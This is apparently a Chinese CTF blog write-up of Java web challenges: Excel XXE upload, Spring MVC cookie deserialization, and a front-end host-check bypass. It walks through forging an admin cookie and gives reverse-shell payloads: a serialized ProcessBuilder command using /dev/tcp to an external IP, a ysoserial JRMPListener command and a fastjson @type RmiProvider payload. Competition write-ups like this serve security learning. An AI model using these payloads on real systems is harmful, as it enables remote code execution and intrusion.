---
title: java_web题目复现记录
author: ch4ser
typora-root-url: ../
date: 2020-01-03 10:57:44
categories:
  - CTF
---



开一个新坑~~

<!--more-->

## 2020 网鼎杯 filejava

读目录可以爆出绝对路径

读下tomcat的日志(logs/catalina.out), 看到一个war包, 下载, 看到upload的时候会解析

```
if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
    try {
        Workbook wb1 = WorkbookFactory.create(in);
        Sheet sheet = wb1.getSheetAt(0);
        System.out.println(sheet.getFirstRowNum());
    } catch (InvalidFormatException var20) {
        System.err.println("poi-ooxml-3.10 has something wrong");
        var20.printStackTrace();
    }
}
```

然后参考https://www.jishuwen.com/d/2inW/zh-hk 把workbook.xml和content-type.xml都改了



## 2020 VNCTF easyspringmvc

考察java反序列化

下载war包后用jd-gui打开看源代码, 目录结构

![image-20200301173825332](/images/image-20200301173825332.png)

主要看classes.com下面的

PictureController.class

```java
package WEB-INF.classes.com.controller;

import com.controller.PictureController;
import com.tools.ClientInfo;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.commons.CommonsMultipartFile;


@Controller
public class PictureController
{
  @RequestMapping({"/showpic.form"})
  public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception {
    if (file == null)
      file = "showpic.jsp"; 
    String[] attribute = file.split("\\.");
    String suffix = attribute[attribute.length - 1];
    if (!suffix.equals("jsp")) {
      boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute("cinfo")).getName().equals("admin");
      if (!isadmin && (!suffix.equals("jpg") || !suffix.equals("gif"))) {
        return "onlypic";
      }
      show(httpServletRequest, httpServletResponse, file);
      return "showpic";
    } 
    
    StringBuilder stringBuilder = new StringBuilder();
    for (int i = 0; i < attribute.length - 1; i++) {
      stringBuilder.append(attribute[i]);
    }
    String jspFile = stringBuilder.toString();
    int unixSep = jspFile.lastIndexOf('/');
    int winSep = jspFile.lastIndexOf('\\');
    int pos = (winSep > unixSep) ? winSep : unixSep;
    jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile;
    if (jspFile.equals("")) {
      jspFile = "showpic";
    }
    return jspFile;
  }
  
  private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception {
    httpServletResponse.setContentType("image/jpeg");
    
    InputStream in = httpServletRequest.getServletContext().getResourceAsStream("/WEB-INF/resource/" + filename);
    if (in == null) {
      in = new FileInputStream(filename);
    }
    ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream();
    byte[] b = new byte[1024];
    while (in.read(b) != -1) {
      servletOutputStream.write(b);
    }
    in.close();
    servletOutputStream.flush();
    servletOutputStream.close();
  }
  
  @RequestMapping({"/uploadpic.form"})
  public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception {
    ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute("cinfo");
    if (!cinfo.getGroup().equals("webmanager"))
      return "notaccess"; 
    if (file == null) {
      return "uploadpic";
    }
    
    String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName();
    String realPath = request.getSession().getServletContext().getRealPath("/WEB-INF/resource/");
    String path = realPath + originalFilename;
    file.transferTo(new File(path));
    request.getSession().setAttribute("newpicfile", path);
    return "uploadpic";
  }
}
```

主要用于文件的读取和写入, 会去通过cookie校验身份.

ClientInfoFilter.class

```java
package WEB-INF.classes.com.filters;

import com.tools.ClientInfo;
import com.tools.Tools;
import java.io.IOException;
import java.util.Base64;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ClentInfoFilter
  implements Filter {
  public void init(FilterConfig fcg) {}
  
  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    Cookie[] cookies = ((HttpServletRequest)request).getCookies();
    boolean exist = false;
    Cookie cookie = null;
    if (cookies != null) {
      for (Cookie c : cookies) {
        if (c.getName().equals("cinfo")) {
          exist = true;
          cookie = c;
          
          break;
        } 
      } 
    }
    if (exist) {
      String b64 = cookie.getValue();
      Base64.Decoder decoder = Base64.getDecoder();
      byte[] bytes = decoder.decode(b64);
      ClientInfo cinfo = null;
      if (b64.equals("") || bytes == null) {
        cinfo = new ClientInfo("Anonymous", "normal", ((HttpServletRequest)request).getRequestedSessionId());
        Base64.Encoder encoder = Base64.getEncoder();
        try {
          bytes = Tools.create(cinfo);
        } catch (Exception e) {
          e.printStackTrace();
        } 
        cookie.setValue(encoder.encodeToString(bytes));
      } else {
        try {
          cinfo = (ClientInfo)Tools.parse(bytes);
        } catch (Exception e) {
          e.printStackTrace();
        } 
      } 
      ((HttpServletRequest)request).getSession().setAttribute("cinfo", cinfo);
    } else {
      Base64.Encoder encoder = Base64.getEncoder();
      
      try {
        ClientInfo cinfo = new ClientInfo("Anonymous", "normal", ((HttpServletRequest)request).getRequestedSessionId());
        byte[] bytes = Tools.create(cinfo);
        cookie = new Cookie("cinfo", encoder.encodeToString(bytes));
        cookie.setMaxAge(86400);
        ((HttpServletResponse)response).addCookie(cookie);
        ((HttpServletRequest)request).getSession().setAttribute("cinfo", cinfo);
      } catch (Exception e) {
        e.printStackTrace();
      } 
    } 

    
    chain.doFilter(request, response);
  }
  
  public void destroy() {}
}
```

控制cookie中cinfo项, 并通过cinfo来校验身份, 如果是第一次访问就会给你设置一个cinfo, 身份是Anonymous, 组别是normal

ClientInfo.class 

```java
package WEB-INF.classes.com.tools;

import com.tools.ClientInfo;
import java.io.Serializable;

public class ClientInfo
  implements Serializable {
  private static final long serialVersionUID = 1L;
  private String name;
  private String group;
  private String id;
  
  public ClientInfo(String name, String group, String id) {
    this.name = name;
    this.group = group;
    this.id = id;
  }
  public String getName() { return this.name; } 
  public String getGroup() { return this.group; }
  public String getId() { return this.id; }
}
```

用于存储用户信息, 会被拿来序列化和base64之后作为cinfo的内容.

Tool.class

```java
package WEB-INF.classes.com.tools;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Tools implements Serializable {
  private static final long serialVersionUID = 1L;
  
  public static Object parse(byte[] bytes) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
    return ois.readObject();
  }
  private String testCall;
  public static byte[] create(Object obj) throws Exception {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream outputStream = new ObjectOutputStream(bos);
    outputStream.writeObject(obj);
    return bos.toByteArray();
  }
  
  private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    Object obj = in.readObject();
    (new ProcessBuilder((String[])obj)).start();
  }
}
```

Serializeable接口会去查看当前类中是否定义``writeObject`` ``readObject``如果有的话, 序列化和反序列化就用这两个方法来实现, 否则就用Serializeable 内置的接口去进行序列化反序列化的操作. 

总结起来可能的点

- 读文件
- 反序列化

读文件首先要admin登录才行, 从源码中可以知道用户名用户组, 接下来写java来伪造cinfo.

创建java项目, 拷贝源码, 目录结构如下(由于序列化的时候会带进命名空间信息, 所以一定要对的上)

![image-20200301180703490](/images/image-20200301180703490.png)



Main.java

```java
import java.util.Base64;
import com.tools.Tools;
import com.tools.ClientInfo;

public class Main {
    public static void main(String[] args) {
        try {
            ClientInfo cinfo = new ClientInfo("admin", "webmanager", "B18D77761C9C952BEDB6CDAC4205265B");
            byte[] bytes = Tools.create(cinfo);
            Base64.Encoder encoder = Base64.getEncoder();
            System.out.println(encoder.encodeToString(bytes));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

伪造admin登录后尝试读文件, 这里有个疑惑的地方, 看源码文件读取的路径是直接和``/WEB-INF/resource/``拼接在一起的, 看赵师傅的wp中是靠``/../../etc/passwd``和它拼接之后可以读到文件, 这样的话路径就是``/WEB-INF/resource//../../etc/passwd``了, 然后我尝试不用/开头去拼接成``/WEB-INF/resource/../../../../../../etc/passwd``不管加多少个../都读不到对应的文件, 很是困惑. 然后读/../../flag显示没有权限.

写文件的功能114告诉我可以往../../../../../../../../tmp下面写, 具体多少个../我忘了....但是没有文件包含的地方.

至此文件读取部分走不通了.

反序列化部分.

Tools.java中这段代码

```java
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Object obj = in.readObject();
        (new ProcessBuilder((String[])obj)).start();
    }
```

其中的ProcessBuilder是可以执行系统命令的.

https://blog.csdn.net/wangmx1993328/article/details/80838768

那可以考虑让反序列化的cinfo内容不是Clientinfo的序列化内容而是Tools的序列化内容.

将Tools.java中添加

```java
    private String testCall[];
    public String[] getTestCall() {
        return testCall;
    }
    public void setTestCall(String[] testCall) {
        this.testCall = testCall;
    }
```



Main.java

```java
import java.util.Base64;

import com.tools.Tools;
import com.tools.ClientInfo;

public class Main {
    public static void main(String[] args) {
        try {
            String[] cmd = {"bash", "-c", "bash -i>& /dev/tcp/174.0.220.248/9999 0>&1"};
            Tools tools = new Tools();
            tools.setTestCall(cmd);
            byte[] bytes = Tools.create(tools);
            Base64.Encoder encoder = Base64.getEncoder();
            System.out.println(encoder.encodeToString(bytes));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

反弹shell

最后一步还是有些不明白的地方, 回头来看.

## 2019 空指针ctf 公开赛

hint页面要求是admin才能访问, 那么思路大概清楚了, 就是通过csrf让admin去访问hint然后把响应内容发送回来, 比赛的时候没看js代码就做题就是铁憨憨行为.

```javascript
function isProd(){
    return window.location.host=='treasure.npointer.cn';
}

function loadPage() {
    if (!window.location.hash) {
        window.location.hash = '#home'
    }

    url = window.location.hash.substring(1)+'.html';
    //调试太麻烦了，日常测试放开限制
    if(isProd()) {
        url = window.location.origin + '/' + url;
    }
    $.get(url, function(result){
        $("#content").html(result);
    });

}

window.addEventListener('hashchange',function(event){
   loadPage();
});

loadPage();
```

简单理解一下就是: 当锚点变化的时候, 就判断host, 如果host是``treasure.npointer.cn``就加载``treasure.npointer.cn加锚点加html的值``, 如果不是, 那么就直接加载锚点加上html的值, payload

```
http://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot
```

这里域名后面的``./``也是第一次见识, 他确实能访问到``treasure.npointer.cn``但是host名不再是``treasure.npointer.cn``了, 那么就可以绕过对主机名的判断直接请求锚点后面的值了. 

这里有点坑, 其实是自己第一次接触太菜了.因为同源策略的影响, 服务端那边必须要设置``Access-Control-Allow-Origin=*``否则vps那边会拒绝跨域请求

使用以下脚本在同目录下执行开启python的服务器

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

try:
    from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig
    import sys
    def test (*args):
        test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
except ImportError: # Python 2
    from BaseHTTPServer import HTTPServer, test
    from SimpleHTTPServer import SimpleHTTPRequestHandler

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer)
```

然后发送

```
http://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot
```

nc接受到了源代码.

(分析过程以后补上)



http://www.jackson-t.ca/runtime-exec-payloads.html

vps上面执行

```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTc2LjM3Lzk5OTkgMD4mMQo=}|{base64,-d}|{bash,-i}'
```

通过submit发送

```
{"@\u0074ype":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"39.105.176.37",port:"1088","name":"Object"}
```

